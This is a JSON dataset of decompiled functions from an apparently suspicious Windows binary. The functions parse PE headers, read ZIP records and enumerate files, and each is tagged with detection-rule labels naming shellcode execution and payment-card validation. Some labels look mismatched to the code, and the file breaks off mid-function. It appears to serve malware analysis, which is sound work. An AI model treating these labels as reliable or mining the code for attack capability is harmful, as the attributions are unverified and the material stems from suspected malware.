{
    "00404290": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nbool fcn.00404290(code *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int16_t *unaff_ESI;\n    \n    iVar2 = (*param_1)();\n    if (iVar2 == 0) {\n        return true;\n    }\n    if ((*unaff_ESI != 0x5a4d) || (*(unaff_ESI + 0x1e) == 0)) {\n        return 2;\n    }\n    iVar2 = (*param_1)(unaff_ESI + 0x20, *(unaff_ESI + 0x1e), 0xf8, param_2);\n    if (iVar2 == 0) {\n        return true;\n    }\n    if (((*(unaff_ESI + 0x20) == 0x4550) && (unaff_ESI[0x2c] == 0x10b)) && (unaff_ESI[0x23] != 0)) {\n        iVar2 = unaff_ESI[0x23] * 0x28;\n        *(unaff_ESI + 0xa0) = iVar2;\n        iVar3 = fcn.0042740a(iVar2);\n        *(unaff_ESI + 0x9c) = iVar3;\n        if (iVar3 == 0) {\n            return 3;\n        }\n        iVar1 = unaff_ESI[0x2a] + 0x18 + *(unaff_ESI + 0x1e);\n        *(unaff_ESI + 0x9e) = iVar1;\n        iVar2 = (*param_1)(iVar3, iVar1, iVar2, param_2);\n        return iVar2 == 0;\n    }\n    return 2;\n}\n",
        "token_count": 401
    },
    "00406db0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.00406db0(char **param_1, uint *param_2, int32_t *param_3, int32_t param_4, uint32_t param_5, int32_t param_6\n                    , uint32_t param_7, int32_t param_8, uint32_t param_9)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iStack84;\n    uint uStack80;\n    uchar auStack76 [4];\n    uchar auStack72 [4];\n    uchar auStack68 [4];\n    uint32_t uStack64;\n    uchar auStack60 [4];\n    uchar auStack56 [4];\n    uchar auStack52 [4];\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    uchar auStack36 [4];\n    uchar auStack32 [4];\n    uchar auStack28 [4];\n    int32_t iStack24;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    int32_t iStack8;\n    int32_t iStack4;\n    \n    iVar3 = 0;\n    if (param_1 == NULL) {\n        return -0x66;\n    }\n    pcVar1 = *param_1;\n    if (*pcVar1 == '\\0') {\n        *(pcVar1 + 0x1c) = param_1[5] + param_1[3];\ncode_r0x00406df3:\n        iVar2 = fcn.00406a60(*param_1, &iStack84);\n        if (iVar2 != 0) goto code_r0x00406e08;\n        if (iStack84 != 0x2014b50) {\n            iVar3 = -0x67;\n        }\n    }\n    else {\n        if (pcVar1[1] != '\\0') {\n            (**0x45fe48)(*(pcVar1 + 4), param_1[5] + param_1[3] + *(pcVar1 + 0xc), 0, 0);\n            goto code_r0x00406df3;\n        }\ncode_r0x00406e08:\n        iVar3 = -1;\n    }\n    iVar2 = fcn.004069c0(*param_1, &uStack80);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.004069c0(*param_1, auStack76);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.004069c0(*param_1, auStack72);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.004069c0(*param_1, auStack68);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00406a60(*param_1, &uStack64);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    uStack12 = uStack64 >> 0x10 & 0x1f;\n    iStack4 = (uStack64 >> 0x19) + 0x7bc;\n    iStack8 = (uStack64 >> 0x15 & 0xf) - 1;\n    uStack16 = uStack64 >> 0xb & 0x1f;\n    iStack24 = (uStack64 & 0x1f) * 2;\n    uStack20 = uStack64 >> 5 & 0x3f;\n    iVar2 = fcn.00406a60(*param_1, auStack60);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00406a60(*param_1, auStack56);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00406a60(*param_1, auStack52);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.004069c0(*param_1, &uStack48);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.004069c0(*param_1, &uStack44);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.004069c0(*param_1, &uStack40);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.004069c0(*param_1, auStack36);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.004069c0(*param_1, auStack32);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00406a60(*param_1, auStack28);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    iVar2 = fcn.00406a60(*param_1, &iStack84);\n    if (iVar2 != 0) {\n        iVar3 = -1;\n    }\n    if (iVar3 == 0) {\n        if (param_4 != 0) {\n            uVar4 = param_5;\n            if (uStack48 < param_5) {\n                *(uStack48 + param_4) = 0;\n                uVar4 = uStack48;\n            }\n            if (((uStack48 != 0) && (param_5 != 0)) && (iVar2 = fcn.00406940(param_4, uVar4, 1, *param_1),  iVar2 != 1))\n            {\n                iVar3 = -1;\n            }\n            uStack48 = uStack48 - uVar4;\n            if (iVar3 != 0) goto code_r0x004070a4;\n        }\n        if (param_6 != 0) {\n            uVar4 = uStack44;\n            if (param_7 <= uStack44) {\n                uVar4 = param_7;\n            }\n            if (uStack48 != 0) {\n                pcVar1 = *param_1;\n                if (*pcVar1 == '\\0') {\n                    *(pcVar1 + 0x1c) = *(pcVar1 + 0x1c) + uStack48;\n                    uStack48 = 0;\n                }\n                else if (pcVar1[1] == '\\0') {\n                    iVar3 = -1;\n                }\n                else {\n                    (**0x45fe48)(*(pcVar1 + 4), uStack48, 0, 1);\n                    uStack48 = 0;\n                }\n            }\n            if (((uStack44 != 0) && (param_7 != 0)) && (iVar2 = fcn.00406940(param_6, uVar4, 1, *param_1),  iVar2 != 1))\n            {\n                iVar3 = -1;\n            }\n            iVar2 = uStack48 + (uStack44 - uVar4);\n            goto code_r0x004070a8;\n        }\n    }\ncode_r0x004070a4:\n    iVar2 = uStack48 + uStack44;\ncode_r0x004070a8:\n    if (iVar3 == 0) {\n        if (param_8 != 0) {\n            uVar4 = param_9;\n            if (uStack40 < param_9) {\n                *(uStack40 + param_8) = 0;\n                uVar4 = uStack40;\n            }\n            if (iVar2 != 0) {\n                pcVar1 = *param_1;\n                if (*pcVar1 == '\\0') {\n                    *(pcVar1 + 0x1c) = *(pcVar1 + 0x1c) + iVar2;\n                }\n                else if (pcVar1[1] == '\\0') {\n                    iVar3 = -1;\n                }\n                else {\n                    (**0x45fe48)(*(pcVar1 + 4), iVar2, 0, 1);\n                }\n            }\n            if (((uStack40 != 0) && (param_9 != 0)) && (iVar2 = fcn.00406940(param_8, uVar4, 1, *param_1),  iVar2 != 1))\n            {\n                return -1;\n            }\n            if (iVar3 != 0) {\n                return iVar3;\n            }\n        }\n        if (param_2 != NULL) {\n            puVar5 = &uStack80;\n            for (iVar2 = 0x14; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *param_2 = *puVar5;\n                puVar5 = puVar5 + 1;\n                param_2 = param_2 + 1;\n            }\n        }\n        if (param_3 != NULL) {\n            *param_3 = iStack84;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 2087
    },
    "00409150": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar ** fcn.00409150(char *param_1)\n\n{\n    int32_t iVar1;\n    char **ppcVar2;\n    char **ppcVar3;\n    int32_t iVar4;\n    char **ppcVar5;\n    int32_t iStack140;\n    int32_t iStack136;\n    int32_t iStack132;\n    char *pcStack128;\n    int32_t iStack124;\n    uchar auStack120 [4];\n    int32_t iStack116;\n    int32_t iStack100;\n    int32_t iStack96;\n    int32_t aiStack92 [22];\n    uint uStack4;\n    \n    if (param_1 == NULL) {\n        return NULL;\n    }\n    iVar4 = 0;\n    pcStack128 = NULL;\n    fcn.00427390(&iStack124, 0, 0x7c);\n    iStack100 = fcn.00406bd0(param_1);\n    if (iStack100 != -1) {\n        if (*param_1 == '\\0') {\n            *(param_1 + 0x1c) = iStack100;\n        }\n        else {\n            if (param_1[1] == '\\0') goto code_r0x004091c7;\n            (**0x45fe48)(*(param_1 + 4), *(param_1 + 0xc) + iStack100, 0, 0);\n        }\n        iVar1 = fcn.00406a60(param_1, &iStack140);\n        if (iVar1 == 0) goto code_r0x004091ca;\n    }\ncode_r0x004091c7:\n    iVar4 = -1;\ncode_r0x004091ca:\n    iStack140 = 0;\n    if ((iVar4 == 0) && (iVar1 = fcn.004069c0(param_1, &iStack140),  iVar1 != 0)) {\n        iVar4 = -1;\n    }\n    iStack136 = 0;\n    if ((iVar4 == 0) &&\n       ((iVar1 = fcn.004069c0(param_1, &iStack136),  iVar1 != 0 ||\n        (iVar1 = fcn.004069c0(param_1, &iStack124),  iVar1 != 0)))) {\n        iVar4 = -1;\n    }\n    iStack132 = 0;\n    if ((((((iVar4 == 0) && (iVar4 = fcn.004069c0(param_1, &iStack132),  iVar4 == 0)) && (iStack132 == iStack124)) &&\n         ((iStack136 == 0 && (iStack140 == 0)))) &&\n        ((iVar4 = fcn.00406a60(param_1, &iStack96),  iVar4 == 0 &&\n         ((iVar4 = fcn.00406a60(param_1, aiStack92),  iVar4 == 0 &&\n          (iVar4 = fcn.004069c0(param_1, auStack120),  iVar4 == 0)))))) &&\n       (iStack96 + aiStack92[0] <= *(param_1 + 0xc) + iStack100)) {\n        iStack116 = ((*(param_1 + 0xc) - iStack96) - aiStack92[0]) + iStack100;\n        pcStack128 = param_1;\n        uStack4 = 0;\n        *(param_1 + 0xc) = 0;\n        ppcVar2 = fcn.0042740a(0x80);\n        ppcVar3 = &pcStack128;\n        ppcVar5 = ppcVar2;\n        for (iVar4 = 0x20; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *ppcVar5 = *ppcVar3;\n            ppcVar3 = ppcVar3 + 1;\n            ppcVar5 = ppcVar5 + 1;\n        }\n        fcn.00407170(ppcVar2);\n        return ppcVar2;\n    }\n    if (param_1[0x10] != '\\0') {\n        (**0x45fe30)(*(param_1 + 4));\n    }\n    fcn.00427a17(param_1);\n    return NULL;\n}\n",
        "token_count": 949
    },
    "0040b4a0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b4a0(uint32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_00000020;\n    uint uStack1404;\n    uint arg_8h;\n    uchar auStack1380 [20];\n    uchar auStack1360 [8];\n    uchar auStack1352 [236];\n    uchar auStack1116 [12];\n    uchar auStack1104 [8];\n    uchar auStack1096 [12];\n    uchar auStack1084 [264];\n    uchar auStack820 [4];\n    uchar auStack816 [232];\n    uchar auStack584 [20];\n    uchar auStack564 [276];\n    uchar auStack288 [256];\n    int32_t iStack32;\n    uint32_t uStack16;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x43ab08;\n    iStack12 = *in_FS_OFFSET;\n    uStack16 = *0x44d6a0 ^ &stack0xfffffa9c;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    arg_8h = 9999999;\n    uStack1404 = 0;\n    uStack4 = 0;\n    uVar1 = (**0x45fff4)();\n    uVar1 = (**0x45ff7c)(uVar1);\n    (**0x45fdec)(&stack0xfffffee0, 0x444670, in_stack_00000020);\n    iVar2 = (**0x460058)(&stack0xfffffee0, &stack0xfffffa94);\n    if (iVar2 != -1) {\n        do {\n            iVar3 = (**0x45ffc8)(&stack0xfffffab8, 0x444678);\n            if ((iVar3 != 0) && (iVar3 = (**0x45ffc8)(&stack0xfffffab0, 0x44467c),  iVar3 != 0)) {\n                (**0x45fdec)(&stack0xfffffdcc, 0x444680, in_stack_00000020, &stack0xfffffab0);\n                fcn.00427390(&stack0xfffffbc4, 0, 0x104);\n                (**0x45ff98)(&stack0xfffffbc4, *0x44f0d4);\n                uVar4 = fcn.0041d100(0x1a);\n                (**0x45ff98)(&stack0xfffffbb8, uVar4);\n                (**0x45fe40)(&stack0xfffffdb8, &stack0xfffffbb0, 1);\n                fcn.0040b050(&stack0xfffffba4, uVar1);\n                (**0x45fe9c)(&stack0xfffffba4);\n            }\n            iVar3 = (**0x45feb0)(iVar2, &stack0xfffffa84);\n        } while (iVar3 != 0);\n        (**0x45fe20)(iVar2);\n        fcn.00427390(&stack0xfffffccc, 0, 0x104);\n        (**0x45ff98)(&stack0xfffffccc, *0x44f2b0);\n        uVar4 = (**0x45fe90)(uVar1);\n        fcn.00426730(*0x44f3e0, &stack0xfffffcd0, uVar1, uVar4);\n    }\n    if (0xf < param_1) {\n        fcn.00427a17(uStack16);\n    }\n    *in_FS_OFFSET = iStack32;\n    uStack1404 = 0x40b6b4;\n    fcn.00427841(arg_8h);\n    return;\n}\n",
        "token_count": 853
    },
    "0040db50": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040db50(uint32_t param_1, uint32_t param_2, uint param_3, int32_t param_4, uint32_t param_5, uint param_6, \n                 uchar *param_7, uint32_t param_8, uint param_9, uint param_10, uint32_t param_11, uint32_t param_12, \n                 uint param_13, uint param_14)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t unaff_EBP;\n    uint32_t unaff_ESI;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    uint32_t in_stack_0000004c;\n    uchar in_stack_00000058;\n    uint in_stack_00000068;\n    uint in_stack_0000006c;\n    uchar in_stack_00000074;\n    uint in_stack_00000084;\n    uint in_stack_00000088;\n    uchar in_stack_00000090;\n    uint in_stack_000000a0;\n    uint in_stack_000000a4;\n    uchar in_stack_000000ac;\n    uint in_stack_000000bc;\n    uint in_stack_000000c0;\n    uchar in_stack_000000c8;\n    uint in_stack_000000d8;\n    uint in_stack_000000dc;\n    uchar in_stack_00000114;\n    int32_t in_stack_00003bac;\n    uint32_t in_stack_00003bd4;\n    uchar *in_stack_00003c90;\n    uint arg_8h;\n    uint32_t uStack128;\n    uchar *puVar10;\n    uint32_t uStack88;\n    uchar *puStack76;\n    uchar *puStack72;\n    uchar *puStack52;\n    uchar *puStack48;\n    uint32_t uStack44;\n    uchar *puStack40;\n    uchar *puStack36;\n    uint32_t uStack32;\n    uint uStack12;\n    uint32_t uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43af0c;\n    uStack12 = *in_FS_OFFSET;\n    fcn.00428720();\n    uStack32 = *0x44d6a0 ^ &stack0xffffffe4;\n    *in_FS_OFFSET = &stack0x00003c80;\n    uStack12 = 0;\n    in_stack_0000006c = 0xf;\n    in_stack_00000068 = 0;\n    in_stack_00000058 = 0;\n    in_stack_00000088 = 0xf;\n    in_stack_00000084 = 0;\n    in_stack_00000074 = 0;\n    param_13 = 0xf;\n    param_12 = 0;\n    param_8 = param_8 & 0xffffff00;\n    in_stack_000000a4 = 0xf;\n    in_stack_000000a0 = 0;\n    in_stack_00000090 = 0;\n    in_stack_000000c0 = 0xf;\n    in_stack_000000bc = 0;\n    in_stack_000000ac = 0;\n    in_stack_000000dc = 0xf;\n    in_stack_000000d8 = 0;\n    in_stack_000000c8 = 0;\n    puStack36 = &stack0x00003c94;\n    puStack40 = &stack0x0000003c;\n    uStack44 = 0x40dc38;\n    puStack36 = fcn.0040c640();\n    puStack40 = 0x40dc4d;\n    fcn.00405420();\n    if (0xf < in_stack_0000004c) {\n        puStack40 = param_14;\n        uStack44 = 0x40dc66;\n        fcn.00427a17();\n    }\n    uVar7 = param_12;\n    uVar6 = param_11;\n    puVar10 = param_7;\n    uVar8 = 8;\n    if (param_11 < 8) {\n        uVar8 = param_11;\n    }\n    puStack48 = param_7;\n    if (param_12 < 0x10) {\n        puStack48 = &stack0x0000001c;\n    }\n    uStack44 = 0x444834;\n    puStack52 = 0x40dc9d;\n    puStack40 = uVar8;\n    iVar2 = fcn.0040a130();\n    if (((iVar2 == 0) && (7 < uVar8)) && (uVar8 == 8)) {\n        uStack8 = 8;\n        iVar2 = 8;\n    }\n    else {\n        uVar8 = 7;\n        if (uVar6 < 7) {\n            uVar8 = uVar6;\n        }\n        if (uVar7 < 0x10) {\n            puVar10 = &stack0x0000001c;\n        }\n        uStack44 = 0x444840;\n        puStack52 = 0x40dce9;\n        puStack48 = puVar10;\n        puStack40 = uVar8;\n        iVar2 = fcn.0040a130();\n        if (((iVar2 != 0) || (uVar8 < 7)) || (iVar2 = 7,  uVar8 != 7)) {\n            iVar2 = 0;\n        }\n    }\n    puStack40 = 0x1;\n    uStack44 = iVar2 + 1;\n    puStack48 = &stack0xfffffff4;\n    uStack12._0_1_ = 0x2f;\n    puStack52 = 0x40dd21;\n    iVar3 = fcn.0040a780();\n    if (iVar3 == -1) {\n        puStack52 = NULL;\n        param_2 = 0xf;\n        param_1 = 0;\n        uStack12._0_1_ = 0;\n        fcn.004052f0();\n        uVar6 = 1;\n    }\n    else {\n        puStack52 = 0xffffffff;\n        fcn.0040d1d0();\n        uVar6 = 2;\n    }\n    puStack40 = uVar6;\n    fcn.00405420();\n    if ((uVar6 & 2) != 0) {\n        uVar6 = uVar6 & 0xfffffffd;\n        uStack44 = uVar6;\n        if (0xf < param_12) {\n            fcn.00427a17();\n        }\n        param_12 = 0xf;\n        param_11 = 0;\n        param_7 = param_7 & 0xffffff00;\n    }\n    if (((uVar6 & 1) != 0) && (uVar6 = uVar6 & 0xfffffffe,  uStack44 = uVar6,  0xf < uStack8)) {\n        fcn.00427a17();\n    }\n    if (iVar3 == -1) {\n        puStack72 = in_stack_00003c90;\n        if (param_5 < 0x10) {\n            puStack72 = *0x10;\n        }\n        puStack72 = puStack72 + param_4;\n    }\n    else {\n        puStack72 = in_stack_00003c90;\n        if (param_5 < 0x10) {\n            puStack72 = *0x10;\n        }\n        puStack72 = puStack72 + iVar3;\n    }\n    if (param_5 < 0x10) {\n        in_stack_00003c90 = *0x10;\n    }\n    puStack76 = in_stack_00003c90 + iVar2;\n    uStack8 = 0xf;\n    uStack12 = 0;\n    fcn.0040ad90();\n    fcn.00405420();\n    if (0xf < unaff_ESI) {\n        fcn.00427a17();\n    }\n    uStack88 = 0;\n    iVar3 = fcn.0040a780();\n    if (iVar3 == -1) {\n        puVar10 = &stack0x0000001c;\n        puStack36 = 0xf;\n        puStack40 = NULL;\n        fcn.00405200();\n        uVar6 = uVar6 | 8;\n    }\n    else {\n        puVar10 = *0x10;\n        fcn.0040d1d0();\n        uVar6 = uVar6 | 4;\n    }\n    fcn.00405420();\n    if ((uVar6 & 8) != 0) {\n        uVar6 = uVar6 & 0xfffffff7;\n        if (0xf < puStack52) {\n            fcn.00427a17();\n        }\n        puStack52 = 0xf;\n        puStack72 = puStack72 & 0xffffff00;\n        uStack88 = uVar6;\n    }\n    if (((uVar6 & 4) != 0) && (uVar6 = uVar6 & 0xfffffffb,  uStack88 = uVar6,  0xf < param_1)) {\n        fcn.00427a17();\n    }\n    iVar3 = fcn.0040a780();\n    if (iVar3 == -1) {\n        uStack128 = 0x44463d;\n        fcn.004052f0();\n        uVar6 = uVar6 | 0x20;\n    }\n    else {\n        uStack128 = iVar3 + 1;\n        fcn.0040d1d0();\n        uVar6 = uVar6 | 0x10;\n    }\n    fcn.00405420();\n    if ((uVar6 & 0x20) != 0) {\n        uVar6 = uVar6 & 0xffffffdf;\n        if (0xf < puStack76) {\n            fcn.00427a17();\n        }\n        puStack76 = 0xf;\n    }\n    if (((uVar6 & 0x10) != 0) && (uVar6 = uVar6 & 0xffffffef,  0xf < unaff_EBP)) {\n        fcn.00427a17();\n    }\n    fcn.0040d1d0();\n    fcn.00405420();\n    if (0xf < puStack36) {\n        fcn.00427a17();\n    }\n    if (iVar2 == 0) {\n        fcn.004052f0();\n        uVar6 = uVar6 | 0x80;\n    }\n    else {\n        fcn.0040d1d0();\n        uVar6 = uVar6 | 0x40;\n    }\n    fcn.00405420();\n    if (uVar6 < '\\0') {\n        uVar6 = uVar6 & 0xffffff7f;\n        if (0xf < puVar10) {\n            fcn.00427a17();\n        }\n        puVar10 = 0xf;\n    }\n    if (((uVar6 & 0x40) != 0) && (uVar6 = uVar6 & 0xffffffbf,  0xf < puStack48)) {\n        fcn.00427a17();\n    }\n    iVar2 = fcn.0040a780();\n    if (iVar2 == -1) {\n        fcn.004052f0();\n        uVar6 = uVar6 | 0x200;\n    }\n    else {\n        fcn.0040d1d0();\n        uVar6 = uVar6 | 0x100;\n    }\n    fcn.00405420();\n    uVar7 = uVar6;\n    if (((uVar6 & 0x200) != 0) && (uVar7 = uVar6 & 0xfffffdff,  0xf < uStack128)) {\n        fcn.00427a17();\n    }\n    if (((uVar7 & 0x100) != 0) && (0xf < puStack72)) {\n        fcn.00427a17();\n    }\n    bVar9 = iVar2 == -1;\n    if (bVar9) {\n        fcn.00405200();\n    }\n    else {\n        fcn.0040d1d0();\n    }\n    fcn.00405420();\n    if ((bVar9) && (0xf < &stack0xffffffd8)) {\n        fcn.00427a17();\n    }\n    if ((!bVar9) && (0xf < uStack88)) {\n        fcn.00427a17();\n    }\n    fcn.00427390();\n    puVar4 = puStack52;\n    if (uStack32 < 0x10) {\n        puVar4 = &stack0xffffffcc;\n    }\n    (**0x45feb4)();\n    (**0x45feb4)();\n    arg_8h = 0;\n    iVar2 = (**0x45fed4)();\n    fcn.004289a0();\n    (**0x45ffc8)();\n    if (iVar2 != 0) {\n        iVar2 = (**0x45fff0)();\n        if (iVar2 != 0) {\n            iVar2 = (**0x460034)();\n            if (iVar2 != 0) {\n                iVar2 = (**0x45ffb4)();\n                iVar3 = (**0x46004c)();\n                if ((iVar3 == 0) || (iVar3 = fcn.004289a0(),  iVar3 != 200)) {\n                    fcn.004053e0();\n                    fcn.0040ab60();\n                    fcn.0040ab60();\n                    fcn.0040ab60();\n                    fcn.0040ab60();\n                    fcn.0040ab60();\n                    fcn.0040ab60();\n                    fcn.0040ab60();\n                    goto code_r0x0040e663;\n                }\n                if (iVar2 != 0) {\n                    (**0x45fef8)();\n                    in_stack_00000114 = 0;\n                }\n                (**0x45fed0)();\n            }\n            (**0x45fed0)();\n        }\n        (**0x45fed0)();\n    }\n    pcVar5 = &stack0x00000118;\n    *(puVar4 + 0x14) = 0xf;\n    *(puVar4 + 0x10) = 0;\n    *puVar4 = 0;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    fcn.004052f0();\n    if (0xf < param_2) {\n        fcn.00427a17();\n    }\n    uStack12 = uStack12 & 0xffffff00;\n    if (0xf < unaff_EBP) {\n        fcn.00427a17();\n    }\n    puStack40 = puStack40 & 0xffffff00;\n    if (0xf < puStack48) {\n        fcn.00427a17();\n    }\n    puStack48 = 0xf;\n    puStack52 = NULL;\n    if (0xf < uVar6) {\n        fcn.00427a17();\n    }\n    if (0xf < puStack76) {\n        fcn.00427a17();\n    }\n    if (0xf < puVar10) {\n        fcn.00427a17();\n    }\n    if (0xf < in_stack_00003bd4) {\n        fcn.00427a17();\n    }\ncode_r0x0040e663:\n    *in_FS_OFFSET = in_stack_00003bac;\n    fcn.00427841(arg_8h);\n    return;\n}\n",
        "token_count": 3527
    },
    "0040ee70": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040ee70(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int32_t *in_FS_OFFSET;\n    uint uVar5;\n    uchar *puStack3592;\n    uchar *puStack3588;\n    uint uStack3584;\n    uint uStack3580;\n    uint uStack3576;\n    uint uStack3572;\n    uint uStack3568;\n    uint uStack3564;\n    uint uStack3560;\n    uint uStack3556;\n    uint uStack3552;\n    uint uStack3548;\n    uchar *puStack3544;\n    uchar *puStack3540;\n    uint uStack3536;\n    uint uStack3532;\n    uint uStack3528;\n    uint uStack3524;\n    uint uStack3520;\n    uint uStack3516;\n    uint uStack3512;\n    uint uStack3508;\n    uint uStack3504;\n    uint uStack3500;\n    uint uStack3496;\n    uint uStack3492;\n    uint uStack3488;\n    uint uStack3484;\n    uint uStack3480;\n    uint uStack3476;\n    uint uStack3472;\n    uint uStack3468;\n    uint uStack3464;\n    uint uStack3460;\n    uint uStack3456;\n    uint uStack3452;\n    uint uStack3448;\n    uint uStack3444;\n    uint uStack3440;\n    uint uStack3436;\n    uint uStack3432;\n    uint uStack3428;\n    uint uStack3424;\n    uint uStack3420;\n    uint uStack3416;\n    uint uStack3412;\n    uint uStack3408;\n    uint uStack3404;\n    uint uStack3400;\n    uint uStack3396;\n    uint uStack3392;\n    uint uStack3388;\n    uint uStack3384;\n    uint uStack3380;\n    uint uStack3376;\n    uint uStack3372;\n    uint uStack3368;\n    uint uStack3364;\n    uint uStack3360;\n    uint uStack3356;\n    uint uStack3352;\n    uint uStack3348;\n    uint uStack3344;\n    uint uStack3340;\n    uint uStack3336;\n    uint uStack3332;\n    uint uStack3328;\n    uint uStack3324;\n    uint uStack3320;\n    uint uStack3316;\n    uint uStack3312;\n    uint uStack3308;\n    uint uStack3304;\n    uint uStack3300;\n    uint uStack3296;\n    uint uStack3292;\n    uint uStack3288;\n    uint uStack3284;\n    uint uStack3280;\n    uint uStack3276;\n    uint uStack3272;\n    uint uStack3268;\n    uint uStack3264;\n    uint uStack3260;\n    uint uStack3256;\n    uint uStack3252;\n    uint uStack3248;\n    uchar *puStack3244;\n    uchar *puStack3240;\n    uint uStack3236;\n    uint uStack3232;\n    uint32_t uStack3228;\n    uint uStack3224;\n    uint uStack3220;\n    uint uStack3216;\n    uint uStack3212;\n    ulong uStack3208;\n    uint uStack3200;\n    uint uStack3196;\n    uint uStack3192;\n    uint uStack3188;\n    uint uStack3184;\n    uint uStack3180;\n    uint uStack3176;\n    uint uStack3172;\n    uint uStack3168;\n    uint uStack3164;\n    uchar *puStack3160;\n    uchar *puStack3156;\n    char *pcStack3152;\n    uchar *puStack3148;\n    uint uStack3144;\n    uint uStack3140;\n    uchar *puStack3136;\n    uchar *puStack3132;\n    uchar *puStack3128;\n    char *pcStack3124;\n    uint32_t uStack3120;\n    uint uStack3116;\n    uint uStack3112;\n    uchar *puStack3108;\n    uint uStack3104;\n    uint uStack3100;\n    uint32_t uStack3096;\n    uchar *puStack3092;\n    int32_t iStack3088;\n    uchar *puStack3084;\n    uint uStack3080;\n    uchar *puStack3076;\n    int32_t iStack3072;\n    uchar *puStack3068;\n    char *pcStack3064;\n    char *pcStack3060;\n    char *pcStack3056;\n    uchar *puStack3052;\n    uint uStack3048;\n    uint uStack3044;\n    char *pcStack3040;\n    uint uStack3036;\n    char *pcStack3032;\n    uint uStack3028;\n    uchar *puStack3024;\n    uint *puStack3020;\n    uchar *puStack3016;\n    uint *puStack3012;\n    uchar *puStack3008;\n    uchar *puStack3004;\n    uchar *puStack3000;\n    uint uStack2996;\n    uchar *puStack2992;\n    uchar *puStack2988;\n    uint uStack2984;\n    uint uStack2980;\n    uint uStack2976;\n    uint uStack2972;\n    uint uStack2968;\n    uint uStack2964;\n    uint uStack2960;\n    uint uStack2956;\n    uchar *puStack2952;\n    uint uStack2948;\n    uchar *puStack2944;\n    uint uStack2940;\n    uint uStack2936;\n    uchar *puStack2932;\n    uchar *puStack2928;\n    uint *puStack2924;\n    uchar *puStack2920;\n    uchar *puStack2916;\n    uint *puStack2912;\n    uchar *puStack2908;\n    uchar *puStack2904;\n    uint *puStack2900;\n    uchar *puStack2896;\n    uint uStack2892;\n    uint uStack2888;\n    uint uStack2884;\n    uint uStack2880;\n    uint uStack2876;\n    uint uStack2872;\n    uint uStack2868;\n    uint uStack2864;\n    uint uStack2860;\n    uint uStack2856;\n    uint uStack2852;\n    uint uStack2848;\n    uint uStack2844;\n    uint uStack2840;\n    uint uStack2836;\n    uint uStack2832;\n    uint uStack2828;\n    uint uStack2824;\n    uint uStack2820;\n    uint32_t uStack2816;\n    uint uStack2812;\n    uint uStack2808;\n    uint32_t uStack2804;\n    uint uStack2800;\n    uint uStack2796;\n    uint32_t uStack2792;\n    uint uStack2788;\n    uint uStack2784;\n    uint uStack2780;\n    uint uStack2776;\n    uint uStack2772;\n    uint uStack2768;\n    uint uStack2764;\n    uint uStack2760;\n    uint uStack2756;\n    uint uStack2752;\n    uint uStack2748;\n    uint uStack2744;\n    uint uStack2740;\n    uint uStack2736;\n    uint32_t uStack2732;\n    uchar 